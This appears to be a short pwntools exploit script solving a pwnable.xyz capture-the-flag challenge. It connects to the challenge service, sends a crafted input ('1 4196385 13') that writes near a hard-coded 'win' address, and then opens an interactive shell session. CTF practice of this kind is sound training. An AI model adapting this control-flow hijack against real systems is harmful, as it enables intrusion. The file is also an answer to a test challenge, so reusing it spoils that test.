from pwn import *


sh = remote('svc.pwnable.xyz', 30002)
#sh = process('./challenge')
win = 0x400822
pause()
sh.sendlineafter(': ', '1 4196385 13')
pause()
sh.interactive()
